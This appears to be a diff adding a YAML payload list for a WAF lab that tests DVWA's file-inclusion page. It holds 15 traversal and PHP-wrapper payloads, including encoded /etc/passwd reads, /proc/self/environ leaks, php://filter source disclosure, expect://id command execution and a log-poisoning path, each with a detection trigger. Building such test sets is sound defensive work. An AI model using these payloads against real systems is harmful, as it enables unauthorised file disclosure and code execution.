@@ -1,0 +1,110 @@
+# Local file inclusion / path-traversal payloads — 15 entries.
+# Sources: PayloadsAllTheThings/File Inclusion, OWASP WSTG.
+#
+# DVWA /vulnerabilities/fi/?page=<payload> passes through include(). Trigger
+# is the first line of /etc/passwd or a well-known PHP session marker.
+
+- id: lfi-passwd-basic
+  class: lfi
+  payload: "../../../../etc/passwd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — baseline traversal"
+
+- id: lfi-passwd-enc
+  class: lfi
+  payload: "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "OWASP WSTG v4.2 §4.9.1"
+
+- id: lfi-passwd-double-enc
+  class: lfi
+  payload: "..%252F..%252F..%252Fetc%252Fpasswd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — double URL enc"
+
+- id: lfi-passwd-utf8
+  class: lfi
+  payload: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — UTF-8 overlong"
+
+- id: lfi-passwd-nullbyte
+  class: lfi
+  payload: "../../../../etc/passwd%00"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — null-byte truncation"
+
+- id: lfi-passwd-dots
+  class: lfi
+  payload: "....//....//....//etc/passwd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — dot compression"
+
+- id: lfi-passwd-abs
+  class: lfi
+  payload: "/etc/passwd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — absolute path"
+
+- id: lfi-hosts
+  class: lfi
+  payload: "../../../../etc/hosts"
+  trigger: { kind: regex, pattern: "127\\.0\\.0\\.1|localhost" }
+  cwe: CWE-22
+  source: "OWASP WSTG — /etc/hosts canary"
+
+- id: lfi-proc-self
+  class: lfi
+  payload: "../../../../proc/self/environ"
+  trigger: { kind: regex, pattern: "PATH=|HOME=" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — procfs leak"
+
+- id: lfi-php-filter-b64
+  class: lfi
+  payload: "php://filter/convert.base64-encode/resource=index.php"
+  trigger: { kind: regex, pattern: "[A-Za-z0-9+/]{40,}={0,2}" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — php://filter"
+
+- id: lfi-php-input
+  class: lfi
+  payload: "php://input"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — php://input wrapper"
+
+- id: lfi-data-uri
+  class: lfi
+  payload: "data://text/plain,waflab-lfi-probe"
+  trigger: { kind: contains, needle: "waflab-lfi-probe" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — data:// wrapper"
+
+- id: lfi-zip-wrapper
+  class: lfi
+  payload: "zip:///var/www/html/shell.zip%23payload"
+  trigger: { kind: regex, pattern: "root:|shell" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — zip:// wrapper"
+
+- id: lfi-expect-wrapper
+  class: lfi
+  payload: "expect://id"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-22
+  source: "PayloadsAllTheThings — expect:// wrapper"
+
+- id: lfi-log-file
+  class: lfi
+  payload: "../../../../var/log/nginx/access.log"
+  trigger: { kind: regex, pattern: "\\d+\\.\\d+\\.\\d+\\.\\d+" }
+  cwe: CWE-22
+  source: "OWASP — log poisoning path"
